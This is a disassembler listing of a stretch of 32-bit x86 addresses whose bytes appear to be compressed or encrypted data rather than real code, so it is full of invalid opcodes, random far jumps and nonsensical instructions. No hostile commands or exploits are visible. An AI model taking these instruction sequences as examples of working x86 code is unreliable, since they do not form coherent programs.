  4142ab:	and    edi,DWORD PTR [edi+ebx*2]
  4142ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142af:	addr16 pop edi
  4142b1:	xchg   ebx,eax
  4142b2:	ror    BYTE PTR [ebp+0xc2],1
	...
  414314:	add    BYTE PTR [eax],al
  414316:	add    DWORD PTR [ecx-0x2122293],eax
  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0x47da834
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    bl,ah
  41432f:	fs push edi
  414331:	xor    bh,BYTE PTR [esi-0x3d]
  414334:	ins    DWORD PTR es:[edi],dx
  414335:	fsubr  DWORD PTR [esi]
  414337:	push   ebp
  414338:	int    0xe6
  41433a:	stos   BYTE PTR es:[edi],al
  41433b:	repnz loopne 0x4142dd
  41433e:	(bad)  
  41433f:	xlat   BYTE PTR ds:[ebx]
  414340:	pushf  
  414341:	push   ds
  414342:	adc    al,0x8
  414344:	fist   WORD PTR [ecx-0x7e98fdcb]
  41434a:	mov    ?,esp
  41434c:	mov    al,ds:0x19833bf7
  414351:	inc    esp
  414352:	pop    esp
  414353:	das    
  414354:	neg    edi
  414356:	inc    esi
  414357:	mov    ecx,0xc9688a54
  41435c:	jne    0x41436c
  41435e:	lock mov eax,0x8256c9e1
  414364:	jo     0x414350
  414366:	sbb    ah,BYTE PTR [ecx]
  414368:	sub    DWORD PTR [eax],esp
  41436a:	and    BYTE PTR [ebp-0x62],bh
  41436d:	mov    cs,WORD PTR [eax]
  41436f:	jmp    0xca2f:0xf20931c8
  414376:	sbb    ah,BYTE PTR [ebx-0x335752ca]
  41437c:	push   es
  41437d:	gs inc esp
  41437f:	cmp    bh,ah
  414381:	xor    eax,0x16628da4
  414386:	push   es
  414387:	mov    dl,0x8a
  414389:	mov    cl,ch
  41438b:	mov    bh,0x66
  41438d:	xor    al,0xd3
  41438f:	mov    esi,0x51167605
  414394:	or     bl,BYTE PTR [edx]
  414396:	mov    dh,0x59
  414398:	out    0x29,al
  41439a:	mov    bl,0xff
  41439c:	sub    edi,DWORD PTR [edx+0x75bba902]
  4143a2:	fld    st(7)
  4143a4:	ja     0x41439a
  4143a6:	mov    ecx,0xec4c4091
  4143ab:	mov    bl,0x3e
  4143ad:	imul   eax,DWORD PTR [ebx+0xd2d9064],0xb663f9d2
  4143b7:	std    
  4143b8:	and    DWORD PTR ds:0x28b5622e,eax
  4143be:	das    
  4143bf:	jno    0x4143e7
  4143c1:	call   0xe90aca52
  4143c6:	mov    bh,0x5
  4143c8:	push   es
  4143c9:	add    BYTE PTR [edx+0x5160c29d],dl
  4143cf:	cs dec esi
  4143d1:	lods   eax,DWORD PTR ds:[esi]
  4143d2:	jmp    0x7f43:0xaba072c4
  4143d9:	or     DWORD PTR [ecx],edi
  4143db:	sub    BYTE PTR [esi],dh
  4143dd:	jmp    0x4143ea
  4143df:	mov    esi,0x1d551e54
  4143e4:	imul   edx
  4143e6:	aaa    
  4143e7:	jae    0x4143db
  4143e9:	cdq    
  4143ea:	dec    ecx
  4143eb:	sbb    al,0x84
  4143ed:	dec    esi
  4143ee:	sbb    eax,0x4b916382
  4143f3:	enter  0x55b9,0xab
  4143f7:	push   edx
  4143f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143f9:	(bad)  
  4143fa:	bound  eax,QWORD PTR [ebx+edi*8+0x67]
  4143fe:	xor    eax,0xc18e2552
  414403:	test   eax,0x1fa39fc5
  414408:	aaa    
  414409:	push   edi
  41440a:	adc    BYTE PTR [edx+0x4d387722],cl
  414410:	xchg   DWORD PTR [esi+esi*4-0x35],ebx
  414414:	and    ch,ch
  414416:	mov    bh,0x6e
  414418:	pop    ecx
  414419:	cmp    DWORD PTR [ebp+0x3a],esi
  41441c:	dec    esp
  41441d:	mov    ecx,0xc5a2f28d
  414422:	nop
  414423:	adc    esp,DWORD PTR [edi+0x517255a7]
  414429:	jp     0x414464
  41442b:	mov    cl,0xe7
  41442d:	sbb    al,0x7c
  41442f:	rol    bl,1
  414431:	jmp    0x11de28b
	...
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	jb     0x414438
  4144a4:	rcl    ch,1
  4144a6:	or     ebx,edx
  4144a8:	add    BYTE PTR [eax],al
  4144aa:	pop    es
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    al,dh
  4144af:	shl    BYTE PTR [esi],cl
  4144b1:	pop    esp
  4144b2:	loopne 0x4144b2
  4144b4:	dec    esi
  4144b5:	sbb    eax,0x83f2460d
  4144ba:	lahf   
  4144bb:	in     al,dx
  4144bc:	jge    0x414533
  4144be:	cld    
  4144bf:	jmp    0x414462
  4144c1:	cli    
  4144c2:	xor    BYTE PTR [ecx+0x715f36d4],ch
  4144c8:	and    eax,0x2c401cb6
  4144cd:	pop    ebp
  4144ce:	push   0x3e
  4144d0:	push   edi
  4144d1:	test   al,0xdb
  4144d3:	ret    0x5258
  4144d6:	stos   DWORD PTR es:[edi],eax
  4144d7:	sbb    BYTE PTR [ebp+0x666efeef],bh
  4144dd:	mov    eax,0xe1211bb9
  4144e2:	lahf   
  4144e3:	add    DWORD PTR [ecx-0x4184fe00],ebx
  4144e9:	mov    eax,0xba624e77
  4144ee:	add    DWORD PTR [esi+0x73],ecx
  4144f1:	pop    es
  4144f2:	ret    0x3043
  4144f5:	sub    eax,0x984b17c2
  4144fa:	repnz adc al,0x35
  4144fd:	rcl    BYTE PTR [ebp+0x6d749402],1
  414503:	stos   BYTE PTR es:[edi],al
  414504:	aad    0xff
  414506:	imul   esp,DWORD PTR [ebp-0x5f],0x1e
  41450a:	mov    ch,0x6b
  41450c:	mov    eax,0x526ea86c
  414511:	data16 xor al,0xa
  414514:	and    BYTE PTR [ebx-0x6cb76dd7],0x56
  41451b:	es out dx,eax
  41451d:	ins    BYTE PTR es:[edi],dx
  41451e:	shr    BYTE PTR gs:0x8d546fd4,cl
  414525:	cs shr dh,1
  414528:	mov    eax,ds:0xe279756a
  41452d:	xchg   sp,ax
  41452f:	cmp    ecx,DWORD PTR [eax]
  414531:	mov    eax,ds:0xda6ac059
  414536:	add    cl,ah
  414538:	test   eax,0x149ef26b
  41453d:	push   es
  41453e:	lock pop ds
  414540:	dec    edx
  414541:	sbb    al,0x39
  414543:	fcomp  DWORD PTR [esi-0x61903cc2]
  414549:	into   
  41454a:	sub    ch,BYTE PTR [esp+esi*2+0x6a641211]
  414551:	xor    DWORD PTR [edx-0x38],0xe0f047ae
  414558:	mov    ah,0x5d
  41455a:	adc    bl,dl
  41455c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41455d:	rcl    esp,1
  41455f:	push   ss
  414560:	stos   BYTE PTR es:[edi],al
  414561:	popa   
  414562:	lea    ebp,[edi-0x46]
  414565:	jle    0x4145c2
  414567:	scas   al,BYTE PTR es:[edi]
  414568:	retf   
  414569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41456a:	add    ecx,DWORD PTR es:[ebp+0x4626d8b]
  414571:	popa   
  414572:	xchg   esp,eax
  414573:	pop    DWORD PTR [edi+0x36]
  414576:	(bad)  
  414578:	retf   
  414579:	add    BYTE PTR [ecx+0x7c],0x48
  41457d:	aaa    
  41457e:	inc    ebx
  41457f:	push   esp
  414580:	mov    ch,BYTE PTR [ebp-0x69]
  414583:	ret    
  414584:	and    al,0x73
  414586:	xchg   esp,eax
  414587:	jge    0x4145a9
  414589:	push   cs
  41458a:	or     BYTE PTR [ebp+0x4b],0x2e
  41458e:	sub    al,0x88
  414590:	xor    BYTE PTR [edx],dh
  414592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414593:	jmp    0xd084f854
  414598:	shl    DWORD PTR [ecx],1
  41459a:	imul   DWORD PTR [edx+0x2f]
  41459d:	int3   
  41459e:	pop    esi
  41459f:	push   ds
  4145a0:	frstor [edx-0x1]
  4145a3:	sar    dl,cl
  4145a5:	inc    ebp
  4145a6:	jg     0x4145d1
  4145a8:	imul   esp,DWORD PTR [ecx+edx*4+0x4e],0x74
  4145ad:	mov    ds:0x1fc35805,eax
  4145b2:	mov    eax,ds:0xc00a
	...
  414613:	add    BYTE PTR [eax],al
  414615:	add    BYTE PTR [edi+0x5e],bh
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0x99450dc2
  414624:	jl     0x414605
  414626:	adc    ah,dl
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [ecx-0x41ac905a],cl
  414633:	xchg   BYTE PTR [edx+0x62193c3f],dh
  414639:	in     eax,0x19
  41463b:	sub    ebx,DWORD PTR [edx-0x55]
  41463e:	inc    DWORD PTR [esi+0x4dc0160]
  414644:	ja     0x414646
  414646:	ret    
  414647:	jecxz  0x41468b
  414649:	imul   edi,DWORD PTR [esi+0x1d],0xffffffd8
  41464d:	(bad)  
  41464e:	loop   0x414677
  414650:	cli    
  414651:	iret   
  414652:	bound  eax,QWORD PTR [esi]
  414654:	pop    ss
  414655:	mov    edx,0x9c00dbfe
  41465a:	pop    ebp
  41465b:	ins    BYTE PTR es:[edi],dx
  41465c:	retf   0x5fb
  41465f:	je     0x414639
  414661:	iret   
  414662:	out    0x69,al
  414664:	call   0x2ad3:0x377169df
  41466b:	add    BYTE PTR ds:0xea89a3ba,bh
  414671:	dec    ebx
  414672:	(bad)  
  414673:	inc    bl
  414675:	ins    DWORD PTR es:[edi],dx
  414676:	pop    ebx
  414678:	add    DWORD PTR [ebx+ebp*8+0x1],esi
  41467c:	call   0xdd7b:0xf272dd
  414683:	mov    bh,0x5f
  414685:	js     0x41461a
  414687:	mov    esi,0xf4252bd1
  41468c:	shl    bl,0xae
  41468f:	mov    ebp,DWORD PTR [ecx-0x70]
  414692:	push   0x83921011
  414697:	lds    eax,FWORD PTR ds:0x40fdab1a
  41469d:	je     0x41468a
  41469f:	aad    0x6a
  4146a1:	sahf   
  4146a2:	repnz cmp al,0x32
  4146a5:	sub    BYTE PTR [ebx-0x58],bl
  4146a8:	push   es
  4146a9:	mov    ebx,0xd795ec89
  4146ae:	and    eax,0x8b3263e0
  4146b3:	pop    eax
  4146b4:	sub    cl,ch
  4146b6:	sbb    al,0xa7
  4146b8:	xchg   ecx,eax
  4146b9:	or     BYTE PTR [ecx-0x23bc5f0e],bh
  4146bf:	mov    bh,0x85
  4146c1:	test   DWORD PTR [ebx],ebx
  4146c3:	out    0xb2,eax
  4146c5:	add    ebp,ecx
  4146c7:	js     0x41465c
  4146c9:	cwde   
  4146ca:	pop    esp
  4146cb:	in     al,0xea
  4146cd:	outs   dx,BYTE PTR ds:[esi]
  4146ce:	cwde   
  4146cf:	cmp    edx,DWORD PTR [ecx+0x56a37488]
  4146d5:	inc    ebx
  4146d6:	rep stos BYTE PTR es:[edi],al
  4146d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d9:	pop    ebx
  4146da:	call   0xa22f4a63
  4146df:	(bad)  
  4146e0:	popf   
  4146e1:	or     cl,BYTE PTR [edx+0x321aad48]
  4146e7:	es int 0xf5
  4146ea:	jl     0x4146ae
  4146ec:	mov    ds:0x6be101fa,eax
  4146f1:	fisubr DWORD PTR [ecx+0x520a2527]
  4146f7:	push   eax
  4146f8:	or     edi,esp
  4146fa:	loope  0x41474d
  4146fc:	sti    
  4146fd:	xor    al,0x7e
  4146ff:	inc    ebp
  414700:	in     al,0x4a
  414702:	punpckldq mm3,DWORD PTR [ecx]
  414705:	push   esp
  414706:	and    cx,ax
  414709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41470a:	push   edx
  41470b:	sti    
  41470c:	int    0xc4
  41470e:	xchg   BYTE PTR [ebx-0x46],ah
  414711:	xor    esi,DWORD PTR [edi-0x22e8ea09]
  414717:	push   edx
  414718:	adc    DWORD PTR [edi+0x77],ebp
  41471b:	or     BYTE PTR [esi],ah
  41471d:	mov    ebx,0x885a9ad4
  414722:	cwde   
  414723:	pop    ds
  414724:	push   edi
  414725:	js     0x4146ef
  414727:	cmp    eax,0xaeafd676
  41472c:	into   
  41472d:	leave  
  41472e:	lahf   
  41472f:	fisub  WORD PTR [ebx-0x244b7195]
	...
  414795:	add    BYTE PTR [esi+0x2f],bh
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	cdq    
  4147a3:	adc    edx,DWORD PTR [eax+0x32]
  4147a6:	pop    ss
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [edx],bl
  4147af:	aas    
  4147b0:	sbb    ch,BYTE PTR [ebx+0x2c]
  4147b3:	pop    ss
  4147b4:	leave  
  4147b5:	jmp    0xc64d:0x258c777b
  4147bc:	mov    ebp,0xd388b9ba
  4147c1:	loop   0x4147ec
  4147c3:	mov    eax,ds:0xf89baea9
  4147c8:	dec    esi
  4147c9:	(bad)  
  4147ca:	mov    al,ds:0x48bcc717
  4147cf:	fcom   DWORD PTR [edi+0x64e0183e]
  4147d5:	jge    0x41480e
  4147d7:	adc    DWORD PTR [ebx-0x2f62219d],edi
  4147dd:	test   DWORD PTR [edi+ebp*8+0x2a],eax
  4147e1:	rol    DWORD PTR [esi],0x3a
  4147e4:	sbb    al,0xee
  4147e6:	pop    ebx
  4147e7:	jmp    0x9108b22f
  4147ec:	sti    
  4147ed:	push   edx
  4147ee:	mov    dl,BYTE PTR [ecx+0x21e2ac0f]
  4147f4:	xchg   ecx,eax
  4147f5:	mov    ds:0xb76cb16e,eax
  4147fa:	outs   dx,BYTE PTR ds:[esi]
  4147fb:	and    eax,0x617f5bb2
  414800:	outs   dx,BYTE PTR ds:[esi]
  414801:	and    eax,0xd2690fc7
  414806:	div    DWORD PTR [edx+0x68d144ac]
  41480c:	jecxz  0x4147e0
  41480e:	mov    al,ds:0x4de4fcf9
  414813:	or     BYTE PTR [eax+ebp*4+0x3b],al
  414817:	scas   eax,DWORD PTR es:[edi]
  414818:	jmp    0xc0df3c51
  41481d:	aas    
  41481e:	(bad)
  414821:	sub    bh,ah
  414823:	inc    eax
  414824:	xchg   DWORD PTR [ebp+0x340e7eee],edi
  41482a:	pop    ecx
  41482b:	out    dx,al
  41482c:	mov    ch,0x17
  41482e:	jle    0x414891
  414830:	pop    ds
  414831:	jnp    0x4147d6
  414833:	and    al,0x9
  414835:	xor    ecx,edi
  414837:	mov    al,0x8d
  414839:	mov    eax,ds:0xa795ea20
  41483e:	and    eax,0x545dbd51
  414843:	pushf  
  414844:	mov    cs,WORD PTR [edi+0x27]
  414847:	test   eax,0xe5b953c0
  41484c:	daa    
  41484d:	sbb    ah,ah
  41484f:	jmp    0x414831
  414851:	dec    esi
  414852:	aad    0xf4
  414854:	imul   edx,DWORD PTR [edi],0xfffffff5
  414857:	(bad)  
  414858:	aam    0x35
  41485a:	outs   dx,DWORD PTR ds:[esi]
  41485b:	push   ecx
  41485c:	ret    0x9abd
  41485f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414860:	shl    BYTE PTR [esi-0xf],1
  414863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414864:	xchg   edx,eax
  414865:	dec    DWORD PTR [ecx]
  414867:	enter  0x14f0,0xef
  41486b:	inc    ecx
  41486c:	out    0xa7,eax
  41486e:	test   BYTE PTR [edi],dh
  414870:	out    dx,eax
  414871:	mov    DWORD PTR [eax],esp
  414873:	jbe    0x4148a2
  414875:	jo     0x4148c1
  414877:	sahf   
  414878:	in     al,0x44
  41487a:	sub    DWORD PTR [ebx],ebp
  41487c:	mov    eax,ds:0x5405271
  414881:	dec    ebp
  414882:	push   ss
  414883:	icebp  
  414884:	jmp    0x414861
  414886:	or     BYTE PTR [esi],0x31
  414889:	iret   
  41488a:	and    DWORD PTR [esi-0x56],ebp
  41488d:	adc    eax,0x893d7d59
  414892:	shl    BYTE PTR [ebx],cl
  414894:	mov    eax,ds:0x5429bbe3
  414899:	jmp    0x9e9a4201
  41489e:	jl     0x41489e
  4148a0:	adc    eax,0xbe071337
  4148a5:	jl     0x414921
  4148a7:	arpl   WORD PTR [edi-0x2e],ax
  4148aa:	adc    eax,0x4bb3407a
  4148af:	sbb    al,0x72
  4148b1:	sub    al,BYTE PTR cs:[ebx+0xa9]
	...
  414914:	add    BYTE PTR [eax],al
  414916:	or     edi,DWORD PTR [esi-0x2e]
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0xefc8c1ed
  414924:	xchg   DWORD PTR [ebp+0x1e],edx
  414927:	(bad)  
  414928:	add    BYTE PTR [eax],al
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [edi+0x5698fa07],cl
  414933:	into   
  414934:	and    DWORD PTR [edi+0x14],0x679e22d1
  41493b:	cmp    DWORD PTR [esi],0x12
  41493e:	ret    
  41493f:	mov    ebx,0x772472a9
  414944:	out    0x22,eax
  414946:	or     DWORD PTR [edi-0xa],esi
  414949:	mov    esi,0x1bba1395
  41494e:	jno    0x414951
  414950:	sub    DWORD PTR [esi],ecx
  414952:	xor    BYTE PTR [eax],0x59
  414955:	test   al,0xb9
  414957:	gs fwait
  414959:	test   bl,dl
  41495b:	repz or BYTE PTR [ebp+0x61239bb4],dl
  414962:	retf   
  414963:	dec    esp
  414964:	sbb    bh,BYTE PTR [edi+edi*1-0xa]
  414968:	mov    bl,0x81
  41496a:	arpl   WORD PTR [ebx-0x12],ax
  41496d:	add    esp,DWORD PTR [ebx+0x34]
  414970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414971:	imul   ebp,DWORD PTR [edi-0x59],0x4c
  414975:	mov    bl,0x97
  414977:	add    al,0xaf
  414979:	push   0xb193d5e5
  41497e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41497f:	jno    0x4149d4
  414981:	ret    0x2061
  414984:	xchg   esi,eax
  414985:	cmp    BYTE PTR [edx+0x5db69a6d],dl
  41498b:	mov    al,ds:0x6fbd020c
  414990:	mov    cl,0x27
  414992:	adc    al,0x58
  414994:	mov    ecx,0x11a05f3f
  414999:	cmp    DWORD PTR [ebx],ecx
  41499b:	ret    0x476e
  41499e:	test   BYTE PTR [edx],ch
  4149a0:	sub    DWORD PTR [esi-0x7e1b6947],0x77541041
  4149aa:	fdiv   QWORD PTR [esi+ecx*8+0x1c]
  4149ae:	imul   eax,DWORD PTR [edi-0x6b9f9c26],0xffffffe1
  4149b5:	mov    eax,DWORD PTR [esi]
  4149b7:	pop    ecx
  4149b8:	repz or bh,dl
  4149bb:	stos   BYTE PTR es:[edi],al
  4149bc:	out    dx,al
  4149bd:	sti    
  4149be:	repnz in al,dx
  4149c0:	sub    edx,DWORD PTR [ecx+0x72e70403]
  4149c6:	or     esi,eax
  4149c8:	fwait
  4149c9:	jae    0x414a31
  4149cb:	inc    eax
  4149cc:	or     eax,0x6cf2b09b
  4149d1:	mov    ecx,DWORD PTR [edx]
  4149d3:	(bad)  
  4149d4:	outs   dx,BYTE PTR ds:[esi]
  4149d5:	enter  0xfb12,0xb4
  4149d9:	xor    dl,BYTE PTR [edi]
  4149db:	mov    ecx,0x461c365b
  4149e0:	xchg   esp,eax
  4149e1:	mov    DWORD PTR [esi-0x32],edi
  4149e4:	repnz aas 
  4149e6:	sahf   
  4149e7:	dec    BYTE PTR [eax+eiz*4-0x47b71041]
  4149ee:	xchg   ebp,eax
  4149ef:	dec    esp
  4149f0:	fwait
  4149f1:	popf   
  4149f2:	jo     0x41498b
  4149f4:	jg     0x41497d
  4149f6:	test   al,0xd9
  4149f8:	mov    ebp,0xed5632d0
  4149fd:	pop    esp
  4149fe:	xchg   ebp,eax
  4149ff:	fdivr  QWORD PTR [edx-0x465bae68]
  414a05:	push   edx
  414a06:	int3   
  414a07:	and    esp,DWORD PTR [esi]
  414a09:	push   edi
  414a0a:	push   ebx
  414a0b:	rcr    DWORD PTR [ebp-0x21],cl
  414a0e:	add    BYTE PTR [ebp-0x61],0xac
  414a12:	xlat   BYTE PTR ds:[ebx]
  414a13:	je     0x4149bf
  414a15:	inc    edx
  414a16:	test   BYTE PTR [edi-0x80],cl
  414a19:	inc    edi
  414a1a:	xchg   esp,eax
  414a1b:	aas    
  414a1c:	or     al,0xfa
  414a1e:	mov    DWORD PTR [edi],edi
  414a20:	xchg   ebp,eax
  414a21:	into   
  414a22:	out    0x44,eax
  414a24:	fidiv  DWORD PTR [esi-0xd]
  414a27:	rcl    DWORD PTR [edi+0x682a477f],0xa5
  414a2e:	sbb    esi,edi
  414a30:	push   ecx
  414a31:	inc    esi
  414a32:	dec    eax
  414a33:	ror    DWORD PTR [eax+0x0],cl
	...
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    esi,DWORD PTR [ebp+0x34]
  414aa4:	data16 in al,0x25
  414aa7:	xlat   BYTE PTR ds:[ebx]
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [esi+ebx*1],dh
  414ab0:	sub    al,0xe7
  414ab2:	push   esp
  414ab3:	mov    DWORD PTR [esi],esp
  414ab5:	sti    
  414ab6:	push   0x704dac09
  414abb:	gs jmp 0x6546bfcc
  414ac1:	ins    BYTE PTR es:[edi],dx
  414ac2:	pop    es
  414ac3:	je     0x414a9f
  414ac5:	sbb    ebp,DWORD PTR [edi-0x71]
  414ac8:	mov    eax,ds:0xcfe4cec0
  414acd:	dec    esi
  414ace:	jge    0x414a5d
  414ad0:	xchg   ebp,eax
  414ad1:	enter  0x94b5,0x57
  414ad5:	sub    al,cl
  414ad7:	imul   esi,DWORD PTR [eax-0x7c],0x1b
  414adb:	cmp    ebx,DWORD PTR [ecx+0x55bfec82]
  414ae1:	dec    esi
  414ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae3:	jmp    0x758e:0xdd876dac
  414aea:	or     ebx,DWORD PTR [edi]
  414aec:	or     al,0xa6
  414aee:	ss mov esp,0xaed94bfd
  414af4:	je     0x414b06
  414af6:	add    eax,0xc7a81c1c
  414afb:	int    0xb1
  414afd:	inc    ebp
  414afe:	xor    DWORD PTR [esi+0x10],eax
  414b01:	jmp    0xd6ce4ca
  414b06:	retf   
  414b07:	jle    0x414a9d
  414b09:	mov    ah,0x21
  414b0b:	xchg   edx,eax
  414b0c:	pop    eax
  414b0d:	shl    DWORD PTR [eax+0x5c],1
  414b10:	inc    edx
  414b11:	pop    ebp
  414b12:	aad    0xcf
  414b14:	and    al,0x50
  414b16:	imul   ecx,edx,0xffffff8e
  414b19:	mov    dh,0xc2
  414b1b:	add    ah,dl
  414b1d:	and    cl,BYTE PTR [ebx]
  414b1f:	enter  0xec69,0xfb
  414b23:	mov    dh,0x38
  414b25:	cld    
  414b26:	add    al,0x4f
  414b28:	adc    BYTE PTR [edx+0x5f568a0d],bh
  414b2e:	test   cl,ch
  414b30:	jnp    0x414b5d
  414b32:	mov    ah,0xd3
  414b34:	jl     0x414ae5
  414b36:	hlt    
  414b37:	jbe    0x414ae2
  414b39:	fcmovnu st,st(0)
  414b3b:	and    eax,0x50710b4e
  414b40:	fcomip st,st(7)
  414b42:	jne    0x414b83
  414b44:	shr    ebp,cl
  414b46:	mov    esp,0x8ad8b951
  414b4b:	push   eax
  414b4c:	aaa    
  414b4d:	pop    es
  414b4e:	imul   esp,DWORD PTR [edx],0x981e4991
  414b54:	pop    esp
  414b55:	pop    edx
  414b56:	sti    
  414b57:	imul   BYTE PTR [ebp+0x74]
  414b5a:	push   ecx
  414b5b:	push   edi
  414b5c:	and    al,0x2b
  414b5e:	(bad)  
  414b5f:	push   esp
  414b60:	call   0x888a:0xd260a905
  414b67:	mov    ah,0xd4
  414b69:	and    bl,ch
  414b6b:	pop    DWORD PTR [esi]
  414b6d:	mov    ecx,0xf81a7ff0
  414b72:	mov    bl,0x9e
  414b74:	aad    0x48
  414b76:	pop    edi
  414b77:	repnz sub dl,BYTE PTR [esi]
  414b7a:	jno    0x414b91
  414b7c:	gs in  eax,dx
  414b7e:	scas   eax,DWORD PTR es:[edi]
  414b7f:	push   edi
  414b80:	out    dx,eax
  414b81:	and    DWORD PTR fs:[ebp+0x26],edx
  414b85:	fwait
  414b86:	(bad)  
  414b87:	jmp    0x414b6a
  414b89:	add    BYTE PTR [ebp+0x1a9356c1],al
  414b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b90:	fs loope 0x414b31
  414b93:	call   0x1500125d
  414b98:	inc    ebp
  414b99:	inc    edx
  414b9a:	call   0x5e55:0xbcc39a99
  414ba1:	iret   
  414ba2:	clc    
  414ba3:	mov    eax,ds:0xe362bbcc
  414ba8:	jmp    0x414ba9
  414baa:	das    
  414bab:	(bad)  
  414bad:	repz or bh,BYTE PTR [edi+ecx*2+0x37]
  414bb2:	mov    ecx,0x1586
	...
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [esp+eiz*2],dh
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	out    dx,al
  414c23:	push   esi
  414c24:	push   cs
  414c25:	and    eax,0xd82c
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    ah,al
  414c2f:	xchg   esp,eax
  414c30:	pop    ecx
  414c31:	hlt    
  414c32:	das    
  414c33:	add    BYTE PTR [ebp-0x8d5176b],bl
  414c39:	lods   eax,DWORD PTR ds:[esi]
  414c3a:	inc    esi
  414c3b:	outs   dx,DWORD PTR ds:[esi]
  414c3c:	xchg   ebp,eax
  414c3d:	dec    esi
  414c3e:	mul    BYTE PTR [ebx-0x3c]
  414c41:	add    ebp,eax
  414c43:	stc    
  414c44:	push   0x5c
  414c46:	shl    edi,0x39
  414c49:	mov    ah,0x68
  414c4b:	addr16 xchg esi,eax
  414c4d:	or     BYTE PTR [edx+0x72],0x5c
  414c51:	sbb    DWORD PTR [ecx+0x1ad416e1],edi
  414c57:	push   eax
  414c58:	dec    esp
  414c59:	in     eax,dx
  414c5a:	mov    edi,0x4d32dea6
  414c5f:	idiv   DWORD PTR [edx+0x44c2a88d]
  414c65:	scas   eax,DWORD PTR es:[edi]
  414c66:	mov    al,0x5
  414c68:	maxps  xmm3,XMMWORD PTR [edi]
  414c6b:	retf   0x957a
  414c6e:	inc    ebx
  414c6f:	cmp    al,0x18
  414c71:	out    0x68,al
  414c73:	into   
  414c74:	retf   
  414c75:	jbe    0x414cc3
  414c77:	dec    edi
  414c78:	icebp  
  414c79:	les    edi,FWORD PTR [ecx]
  414c7b:	xor    eax,0xe11761fc
  414c80:	(bad)  
  414c82:	pop    ebx
  414c83:	xor    edx,0x932fa76e
  414c89:	(bad)  
  414c8a:	mov    ds:0x642c0d7b,eax
  414c8f:	ret    
  414c90:	cmp    bh,BYTE PTR [eax+0x2cda490f]
  414c96:	std    
  414c97:	mov    ds:0x626ffea4,eax
  414c9c:	stc    
  414c9d:	cld    
  414c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9f:	cld    
  414ca0:	add    DWORD PTR [ecx+0x337cb4cd],0xa1eff83b
  414caa:	ret    0x71b5
  414cad:	sbb    BYTE PTR [ecx],dh
  414caf:	jb     0x414d0a
  414cb1:	enter  0xba3c,0xe2
  414cb5:	(bad)  
  414cb6:	adc    eax,0x3ea796c8
  414cbb:	mov    al,ds:0x2bbab6b
  414cc0:	and    eax,0x34d6ff2b
  414cc5:	jb     0x414c81
  414cc7:	xor    esp,edx
  414cc9:	ret    0x4bc6
  414ccc:	xor    al,0xbb
  414ccf:	mov    al,ds:0x14240932
  414cd4:	repz and DWORD PTR [edi],edi
  414cd7:	mov    esp,ecx
  414cd9:	popa   
  414cda:	inc    ebx
  414cdb:	fcom   DWORD PTR [ebx+0x27]
  414cde:	xor    edi,eax
  414ce0:	sahf   
  414ce1:	test   edx,edx
  414ce3:	add    ebx,edi
  414ce5:	inc    edx
  414ce6:	leave  
  414ce7:	mov    ebx,ebp
  414ce9:	enter  0xa270,0x84
  414ced:	pusha  
  414cee:	cmp    ebp,ecx
  414cf0:	sbb    eax,0x64721e4e
  414cf5:	xlat   BYTE PTR ds:[ebx]
  414cf6:	sub    ch,BYTE PTR [eax-0x6fe71963]
  414cfc:	jae    0x414cfc
  414cfe:	jbe    0x414cfa
  414d00:	lods   eax,DWORD PTR ds:[esi]
  414d01:	jecxz  0x414d6d
  414d03:	inc    esi
  414d04:	(bad)  
  414d05:	jge    0x414d6b
  414d07:	xor    al,0x63
  414d09:	or     al,0xcd
  414d0b:	mov    ecx,0x809f2a38
  414d10:	pop    ebx
  414d11:	retf   
  414d12:	push   0x13f1fec3
  414d17:	push   ebx
  414d18:	push   es
